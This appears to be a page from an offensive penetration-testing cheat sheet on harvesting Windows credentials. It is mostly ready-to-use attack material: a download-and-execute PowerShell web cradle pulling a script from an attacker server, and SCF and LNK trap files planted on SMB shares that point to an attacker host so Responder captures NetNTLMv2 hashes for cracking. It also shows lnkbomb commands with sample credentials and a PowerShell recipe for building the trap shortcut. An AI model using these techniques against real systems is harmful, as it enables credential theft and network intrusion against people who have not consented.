See [Relay Potato]({{< relref "6. Privilege Escalation/Windows/Relay Potato#relay-potato" >}}) too
## Monitor processes

> Windows have a lot of options to pass credential straight into command line

Make this powershell script, `procmon.ps1`, then either executes it

```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

Or we can also use web cradle. The script is on our attacker machine, so we open a http server

```sh
python3 -m http.server 80
```

```powershell
IEX (iwr 'http://10.10.14.44/procmon.ps1')
```
## File share

> We can place malicious files on file share, then wait for anyone to browse through there, or click on them. This will make a call back to our smb server, and we get `netNTLMv2` hash to crack
### SMB `scf` file upload

> Doesn't work after Windows Server 2019

Start a responder listener on current network interface

```sh
sudo responder -I tun0
```

>`hashcat`'s mode for `netNTLMv2` is 5600

Upload `@Report.scf` onto the target's SMB. Whoever access the folder you uploaded `@Report.scf` to will be hit. The ip here is attacker's ip

```
[Shell]
Command=2
IconFile=\\10.10.14.17\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

### SMB `lnk` file upload
#### `lnkbomb`

[Github Page](https://github.com/dievus/lnkbomb)

```sh
git clone https://github.com/dievus/lnkbomb.git
cd lnkbomb
python -m venv .venv
source .venv/bin/activate
pip install -r ./requirements.txt
```

`-t` for target IP, `-a` for attacker IP, `-n` for netbios name of target machine.

```sh
python3 .\lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows
```

#### Powershell way (annoying)

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
